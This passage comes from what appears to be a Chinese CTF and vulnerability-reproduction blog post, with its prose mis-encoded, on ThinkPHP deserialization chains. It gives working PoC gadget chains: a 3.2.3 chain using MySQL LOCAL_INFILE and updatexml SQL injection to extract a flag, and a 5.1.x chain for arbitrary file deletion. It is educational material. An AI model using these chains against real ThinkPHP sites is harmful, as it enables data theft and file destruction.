class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;name where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å…¥å£æ–‡ä»¶å¤„æ·»åŠ å¦‚ä¸‹ä»£ç ä»¥æµ‹è¯•,åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå°±æ˜¯å› ä¸ºå‡ºç°äº†å¯åˆ©ç”¨ç‚¹ï¼Œæ‰èƒ½é€šè¿‡æ¼æ´è¿›è¡Œä¸€ç³»åˆ—æ“ä½œ</p><p><strong>IndexController.class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d1f655cd8e3d480891710c4eae74e309.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¾‹é¢˜å®æ“"><a href="#ä¾‹é¢˜å®æ“" class="headerlink" title="ä¾‹é¢˜å®æ“"></a>ä¾‹é¢˜å®æ“</h2><h3 id="BUU-çº¢æ˜è°·CTF-2021-EasyTP"><a href="#BUU-çº¢æ˜è°·CTF-2021-EasyTP" class="headerlink" title="BUU [çº¢æ˜è°·CTF 2021]EasyTP"></a>BUU [çº¢æ˜è°·CTF 2021]EasyTP</h3><p>å¯åŠ¨é¢˜ç›®</p><p><img src="https://img-blog.csdnimg.cn/1f6cfbd34a1b45cbb4ec35eeb651ae18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç ï¼Œæ²¡å‘ç°ç‰¹æ®Šçš„åœ°æ–¹ï¼Œ<strong>dirsearch</strong>æ‰«ç›®å½•ï¼Œå‘ç°<strong><a href="http://www.zip/">www.zip</a></strong>æ–‡ä»¶å¤‡ä»½</p><p>downä¸‹æ¥ï¼Œå‘ç°æ˜¯<strong>tp3.2.3</strong>ï¼Œè®¿é—®<strong>localhost&#x2F;tp3.2.3</strong>ä»¥ç”Ÿæˆæœ¬åœ°æ–‡ä»¶ï¼Œæ¥åˆ°<code>\tp3.2.3\Application\Home\Controller\IndexController.class.php</code>ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨<strong>test</strong>æ–¹æ³•ï¼Œå› ä¸º<strong>index</strong>æ–¹æ³•è¿˜è°ƒç”¨äº†<strong>display</strong>å‡½æ•°ï¼Œè¿™ä¸ªé¢˜åªæ˜¯æ”¹äº†é¦–é¡µå³<strong>IndexController.class.php</strong>ï¼Œæ›´æ”¹å…¶åˆ©ç”¨æ–¹å¼ä¸º<code>php://input</code>ï¼Œå…¶ä»–å’Œä¸Šè¿°è®²çš„å®Œå…¨ä¸€æ ·</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span> <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>, <span class="comment">// å¯æ¢æˆä»»ä½•ä¸€ä¸ªå­˜åœ¨çš„åº“</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span> <span class="comment">// BUUä¸‹çš„å¯†ç ä¸ºroot</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">//å‰é¢çš„æŸ¥åº“æŸ¥è¡¨å°±ä¸åœ¨è¿™å„¿ä¸€ä¸€å†™äº†</span></span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where updatexml(1,concat(0x7e,substr((select`*`from`flag`),1,30),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/331aaf9df1ba4aa287f0aa6820bc0ee3.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ›´æ”¹<strong>substr</strong>æˆªå–çš„å€¼å³å¯è·å¾—ååŠæ®µ<strong>flag</strong></p><h1 id="Thinkphp5-1-x"><a href="#Thinkphp5-1-x" class="headerlink" title="Thinkphp5.1.x"></a>Thinkphp5.1.x</h1><p><a href="https://paper.seebug.org/1040/#_2">Thinkphp ååºåˆ—åŒ–åˆ©ç”¨é“¾æ·±å…¥åˆ†æ (seebug.org)</a></p><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>composer</strong>ä¸€æŠŠæ¢­ï¼Œä¸ä¼šçš„å¯å‚è€ƒ<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">æ–‡ç« </a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=(è¾“å…¥ä½ æƒ³è¦ä¸‹è½½çš„ç‰ˆæœ¬) tp5.1(æ–‡ä»¶å¤¹çš„åç§°)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ååºåˆ—åŒ–æ¼æ´ä¸€èˆ¬æ˜¯é€šè¿‡å¤šç§<strong>é­”æœ¯æ–¹æ³•</strong>çš„è‡ªåŠ¨è°ƒç”¨ï¼Œä»è€Œæ„é€ <strong>pop</strong>é“¾ï¼Œå®ç°<strong>getshell</strong></p><p>ä¸€èˆ¬ä»¥<code>__destruct</code>æˆ–è€…<code>__wakeup</code>ä½œä¸ºèµ·ç‚¹ã€‚</p><p>å…¨å±€æœç´¢**__destruct<strong>ï¼Œæœ€ç»ˆæ¥åˆ°</strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php<strong>ä¸‹çš„</strong>__destruct**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè·Ÿè¿›<strong>close</strong>å‡½æ•°ï¼Œæœ€ç»ˆå‘ç°ä¸å¯æ§ï¼Œå†è·Ÿè¿›<strong>removeFiles</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/aa25c983ce3547ca9272669afe0f8f4a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_14,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>$this-&gt;files</strong>å¯æ§</p><p><img src="https://img-blog.csdnimg.cn/8fc786012390477b9e19dcbd0a3acc96.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥ï¼Œåˆ°è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´æ‰§è¡Œä»»æ„æ–‡ä»¶åˆ é™¤äº†</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="string">&#x27;æ–‡ä»¶è·¯å¾„&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åœ¨<code>removeFiles()</code>ä¸­ä½¿ç”¨äº†<code>file_exists</code>å¯¹<code>$filename</code>è¿›è¡Œå¤„ç†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/0e304a1d943845d891bb31ed6f554c2f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>file_exists</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/a892c1d3de7848a99e1f1029eb3764de.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°**$filename<strong>ä¼šè¢«å½“åš</strong>å­—ç¬¦ä¸²<strong>å¤„ç†ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬ä»¤</strong>$filename<strong>ä¸ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¿™æ—¶å°±ä¼šè‡ªåŠ¨è§¦å‘</strong>__toString**é­”æœ¯æ–¹æ³•</p><p>æ¥ä¸‹æ¥å…¨å±€æ‰¾**__toString**æ–¹æ³•</p><p>è·Ÿè¿›åˆ°<code>\thinkphp\library\think\model\concern\Conversion.php</code></p><p><img src="https://img-blog.csdnimg.cn/e76c44da7f25459f96c8ca19ebc856d5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>toJson</strong>æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/80846231122842949c5e5fdeab584978.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>toArray</strong>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span 